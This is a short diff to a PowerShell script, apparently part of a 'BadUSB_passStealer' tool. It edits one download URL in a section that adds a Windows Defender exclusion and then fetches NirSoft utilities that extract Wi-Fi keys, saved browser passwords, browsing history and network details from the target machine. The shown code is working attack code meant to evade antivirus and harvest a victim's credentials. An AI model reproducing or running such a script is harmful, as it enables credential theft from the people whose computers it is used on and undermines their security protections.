@@ -17,7 +17,7 @@ Add-MpPreference -ExclusionPath $basePath -Force
 
 # Download necessary tools
 Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe
-Invoke-WebRequest https://github.com/whetherit/tools/raw/refs/heads/main/WebBrowserPassView.exe -OutFile WebBrowserPassView.exe
+Invoke-WebRequest https://github.com/whetherit/tools/blob/main/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe
 Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe
 Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe
 
